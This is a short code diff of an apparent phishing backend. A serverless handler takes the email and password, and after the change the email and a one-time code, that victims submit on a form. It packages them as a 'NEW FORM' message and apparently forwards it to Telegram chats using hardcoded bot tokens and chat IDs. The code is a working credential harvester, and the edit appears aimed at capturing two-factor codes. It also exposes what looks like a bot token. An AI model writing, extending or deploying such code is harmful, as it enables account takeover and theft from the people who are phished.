@@ -7,21 +7,15 @@ module.exports = async function handler(req, res) {
   const token2 = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
   const chatId = '-5096357861';
   const chatId2 = '-5050388811';
- 
 
   try {
-    const { email, pass, agent } = req.body;
-
-    if (!email || !pass) {
-      return res.status(400).json({ error: 'Missing data' });
-    }
+    const { email, code } = req.body;
 
     const message = `
 📩 NEW FORM
 
 📧 Email: ${email}
-🔑 Pass: ${pass}
-🖥️ Agent: ${agent}
+🔑 code: ${code}
     `;
 
     const tgRes = await fetch(
